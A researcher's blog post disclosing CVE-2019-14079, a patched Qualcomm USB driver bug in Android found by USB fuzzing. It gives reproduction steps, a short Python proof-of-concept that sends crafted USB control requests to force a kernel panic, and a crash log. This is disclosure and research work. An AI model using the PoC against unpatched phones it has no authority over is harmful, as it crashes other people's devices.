# USB device fuzzing on Android (CVE-2019-14079)

This blog post is about a simple bug I found in my android device(MI A2 - runs stock android) using USB device fuzzing and was marked as high severity by google. The bug was in Qualcomm USB driver which was later patched and disclosed in March 2020 Android bulletin. About the vulnerability, when you send a crafted USB requests to the android phone it crashes the android kernel and your phone restarts.

This bug was due to an uninitialized variable used in USB gadget "core.c".  Details about the vulnerability can be found in the below Qualcomm security advisory and android march 2020 bulletin.

https://www.qualcomm.com/company/product-security/bulletins/march-2020-bulletin

## Technical Overview
Android phones support both device and host modes, in device mode you can connect your mobile to a PC using an USB cable and share images, music from your phone to PC with different USB connectivity modes(like only charging, MTP).
In Host mode you can connect a headset, flash drive using an OTG cable where your devices act as a client and your android phone acts as a host.

The vulnerability was found by just randomizing the USB control parameters such as bmRequestType, bRequest,wValue(bDescriptortype:DescriptorIndex),wIndex and wLength and sending it to the Android device. By sending a sequence of control requests from the Linux host to Android (as seen in the script below), the USB device driver in the phone parses it and causes a kernel panic. 

You can check this below video to understand about USB overview and fuzzing by Andrey Konovalov in Offensive-con 2019 and also the USB protocol basics: USB 101: An Introduction to Universal Serial Bus 2.0.

https://www.youtube.com/watch?v=1MD5JV6LfxA

Affected Chipsets: APQ8009, APQ8053, MDM9607, MDM9640, MSM8909W, MSM8953, QCA6574AU, QCS605, SDA845, SDM429, SDM429W, SDM439, SDM450, SDM632, SDM670, SDM710, SDM845, SDX24, SM8150, SXR1130

Steps to reproduce this vulnerability if you have not updated your phone with Android March 2020 patch.
- Connect your android mobile to Linux PC(Ubuntu).
- Verify no USB debugging is enabled in your mobile.
- Device must be connected in normal charging mode .
- In Ubuntu host, the android connects as USB device and gets detected as SDMxxx SN:xxxxxx.
- Check your dmesg logs or lsusb to identify your device.
- Note the VID and PID as per your device using lsusb and use it in the below script.
- Run the below python script in your linux PC with pyusb installed.
If you see your phone restarts, then you have exploited the bug.
You can check your kernel logs for the below messages after restart using logcat or bugreport.

#### POC

```
#!/usr/bin/env python3
import usb.core

dev = usb.core.find(idVendor=0x2717, idProduct=0xff40) 

send = dev.ctrl_transfer(0x80,0,0x0000,0x00,0000) 
send = dev.ctrl_transfer(0x81,0,0x0000,0x00,0000) 
send = dev.ctrl_transfer(0x82,0,0x0000,0x00,0000) 
print("Received: " + str(send))
```

#### Crash Logs

```
[  314.639049] Kernel BUG at ffffff95d9f3ca20 [verbose debug info unavailable]
[  314.639054] Internal error: Oops - BUG: 96000044 [#1] PREEMPT SMP
[  314.639060] Modules linked in: wlan(O)
[  314.639074] CPU: 2 PID: 115 Comm: kworker/u17:1 Tainted: G           O    4.4.153-perf+ #1
[  314.639080] Hardware name: Qualcomm Technologies, Inc. SDM 660 PM660 + PM660L MTP (DT)
[  314.639100] Workqueue: dwc_wq dwc3_bh_work
[  314.639107] task: ffffffc1f7470e00 task.stack: ffffffc1f747c000
[  314.639114] PC is at dwc3_gadget_giveback+0x84/0x1ec
[  314.639121] LR is at dwc3_ep0_stall_and_restart+0x64/0x84
[  314.639126] pc : [<ffffff95d9f3ca20>] lr : [<ffffff95d9f41ae8>] pstate: 804001c5
[  314.639129] sp : ffffffc1f747fbd0
[  314.639133] x29: ffffffc1f747fbd0 x28: ffffffc174099020 
[  314.639141] x27: ffffff95db082010 x26: 000000000000c040 
[  314.639148] x25: ffffffc174099020 x24: ffffff95db806000 
[  314.639156] x23: 0000000000000000 x22: ffffffc1f613da00 
[  314.639164] x21: ffffffc174099020 x20: ffffffc1f613da00 
[  314.639172] x19: ffffffc174099070 x18: 0000000000000010 
[  314.639179] x17: 0000007b609c9578 x16: ffffff95da4be634 
[  314.639186] x15: aaaaaaaaaaaaaaab x14: 0fffffffffffffff 
[  314.639193] x13: 0000000000000008 x12: 0101010101010101 
[  314.639200] x11: 7f7f7f7f7f7f7fff x10: 3952455531fffffe 
[  314.639208] x9 : ffffffffffffffff x8 : 0000000000808000 
[  314.639215] x7 : 0080800000000000 x6 : ffffff95dbbf8852 
[  314.639222] x5 : 3a534656330100ff x4 : 0000000000000001 
[  314.639230] x3 : 000000000000000a x2 : 00000000ffffff98 
[  314.639237] x1 : dead000000000100 x0 : dead000000000200 
```
## Next Steps
Moreover the crash logs doesnt explains the reason behind the crash. So I am planning to add KASAN to the build in my new pixel and improve my device fuzzing with proper instrumentation techniques such as monitoring the logs for crashes while fuzzing. Also libusb does not allows to issue  large control requests and most of times it gets trimmed down. So I am planning to try with kate temkin example(fusee_gelee) of using ioctl to issue commands directly to the USB driver.  

## Timeline
- The issue was reported to Android VRP in August 2019.
- Qualcomm patched it in March 2020. 

## Motivation and Thanks to
- My Mentor(Durga Prasad Sahoo - https://github.com/break2make)
- NCC for USB device fuzzing
- @ktemkin for her nice USB bug in Nintendo Switch
